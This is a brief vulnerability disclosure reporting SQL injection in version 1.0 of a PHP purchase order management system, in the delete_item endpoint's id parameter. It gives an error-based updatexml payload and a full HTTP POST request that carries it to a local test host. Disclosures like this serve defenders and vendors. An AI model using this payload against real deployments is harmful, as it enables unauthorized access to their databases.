# Purchase-order-management-system v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html

Vulnerability File: \purchase_order\classes\Master.php?f=delete_item 

Vulnerability location: /purchase_order/classes/Master.php?f=delete_item, id

[+] Payload: id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+

```sql
POST /purchase_order/classes/Master.php?f=delete_item HTTP/1.1
Host: 192.168.1.19
Content-Length: 65
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/purchase_order/admin/?page=items
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=sils4jibq9sp4e2n7i4joq8to7
Connection: close

id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
```
![image](https://user-images.githubusercontent.com/54017627/160136532-39cd815f-d3de-4d65-91c6-8726f67768fb.png)
